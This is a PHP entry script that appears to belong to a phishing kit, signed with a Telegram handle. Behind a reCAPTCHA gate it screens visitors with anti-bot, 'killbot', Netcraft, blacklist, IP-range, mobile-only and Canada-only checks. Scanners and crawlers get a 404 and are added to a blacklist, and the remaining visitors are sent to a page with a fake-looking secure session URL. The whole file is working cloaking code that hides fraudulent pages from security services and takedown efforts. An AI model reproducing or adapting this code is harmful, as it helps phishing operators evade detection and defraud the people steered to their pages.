<?php
// @Kr3pto on telegram
error_reporting(0);
session_start();
require "configg.php";
if($_SESSION['passed_captcha'] == 'yes'){
	require "configg.php";
	require "tc_assetz/ninc/functions.php";
	
	if($internal_antibot == 1){
		require "tc_assetz/old_blocker.php";
	}
	if($enable_killbot == 1){
		if(checkkillbot($killbot_key) == true){
			$fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
			fputs($fp, "\r\n$ip\r\n");
			fclose($fp);
			header_remove();
			header("Connection: close\r\n");
			http_response_code(404);
			exit;
		}
	}
	if($mobile_lock == 1){
		require "tc_assetz/mob_lock.php";
	}
	if($CA_lock == 1){
		if(onlyca() == true){
		
		}else{
			$fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
			fputs($fp, "\r\n$ip\r\n");
			fclose($fp);
			header_remove();
			header("Connection: close\r\n");
			http_response_code(404);
			exit;
		}
	}
	if($external_antibot == 1){
		if(checkBot($apikey) == true){
			$fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
			fputs($fp, "\r\n$ip\r\n");
			fclose($fp);
			header_remove();
			header("Connection: close\r\n");
			http_response_code(404);
			exit;
		}
	}
	$rand = generateRandomString(130);
	require "tc_assetz/ninc/visitor_log.php";
	require "tc_assetz/ninc/netcraft_check.php";
	require "tc_assetz/ninc/blacklist_lookup.php";
	require "tc_assetz/ninc/ip_range_check.php";
	header("location:38921087434.php?sslchannel=true&sessionid=$rand");
}else{
	echo "<meta name='viewport' content='width=device-width, initial-scale=1' />
<script src='https://www.google.com/recaptcha/api.js'></script>
<form method='post' name='myform'>
    <div
        style='position: absolute; top: 50%; left: 50%; margin-top: -37px; margin-left: -150px; width: 300px; height: 74px;'
        class='g-recaptcha'
        id='g-recaptcha'
        data-sitekey='$site_key'
        data-callback='onReturnCallback'
        data-theme='light'
    ></div>
</form>

<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js'></script>
<script type='text/javascript'>
    var onReturnCallback = function (response) {
        var url = 'validatevisitor.php';
        $.ajax({
            url: url,
			type: 'post',
            dataType: 'json',
            data: { response: response },
            success: function (data) {
                var res = data.success.toString();
				var red = data.redirect.toString();
                if (res == 'true') {
					window.location.reload();
                }else{
					window.location.replace(red);
				}
            },
        });
    };
</script>";
}
?>